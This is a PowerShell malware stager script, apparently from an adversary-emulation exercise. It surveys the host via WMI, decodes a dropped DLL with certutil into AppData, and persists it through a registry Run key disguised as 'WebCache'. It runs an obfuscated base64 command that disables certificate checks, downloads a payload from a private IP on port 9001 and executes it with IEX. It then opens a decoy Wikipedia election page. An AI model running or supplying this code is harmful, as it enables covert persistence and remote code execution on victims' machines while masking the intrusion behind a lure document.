gwmi -namespace root\cimv2 -query "SELECT * FROM Win32_BIOS"
gwmi -namespace root\cimv2 -query "SELECT * FROM Win32_PnPEntity"
gwmi -namespace root\cimv2 -query "Select * from Win32_ComputerSystem"
gwmi -namespace root\cimv2 -query "SELECT * FROM Win32_Process"
(Get-Item -Path ".\" -Verbose).FullName
$bin = ""
$bin | Add-Content -Path blob
certutil -decode blob "$env:appdata\Microsoft\kxwn.lock"
Remove-Item -Path blob
New-ItemProperty -Force -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WebCache" -Value "C:\windows\system32\rundll32.exe $env:appdata\Microsoft\kxwn.lock,VoidFunc"
$enc_ps = "WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQATQBTAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADAALgAxAC4AMQA3ADoAOQAwADAAMQAvAGEAZABzAGUAbgBzAGUALwB0AHIAbwB1AGIAbABlAHMAaABvAG8AdABlAHIALwAxADYAMwAxADMANAAzAC8AXwByAHAAJwApACkAKQA7AEkARQBYACAAJABNAFMA"  
$ps = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($enc_ps))
IEX($ps)
Invoke-Item '2016_United_States_presidential_election_-_Wikipedia.html'